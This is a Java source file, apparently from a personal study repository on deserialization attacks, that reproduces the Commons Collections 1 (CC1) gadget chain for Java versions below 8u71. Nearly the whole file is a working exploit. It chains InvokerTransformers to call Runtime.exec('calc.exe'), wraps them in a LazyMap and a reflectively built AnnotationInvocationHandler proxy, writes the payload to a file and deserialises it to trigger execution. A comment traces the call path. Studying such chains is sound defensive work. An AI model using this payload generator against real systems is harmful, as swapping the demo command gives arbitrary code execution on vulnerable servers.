package run.ergou.deserialize.ysoserial;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

// Java版本：<8u71
public class CC1 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[]{}}
                ),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[]{}}
                ),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new Object[]{"calc.exe"}
                )
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap map = new HashMap();
        Map lazyMap = LazyMap.decorate(map, chainedTransformer);

        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, lazyMap);

        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler);

        handler = (InvocationHandler) constructor.newInstance(Retention.class, proxyMap);

        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("cc1"));
        oos.writeObject(handler);
        oos.close();

        // ObjectInputStream#readObject() -> AnnotationInvocationHandler.readObject(ObjectInputStream in) ->
        // memberValues/*proxyMap*/.entrySet() -> AnnotationInvocationHandler/*handler*/.invoke() ->
        // memberValues/*LazyMap*/.get() -> transform()
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("cc1"));
        ois.readObject();
        ois.close();
    }
}
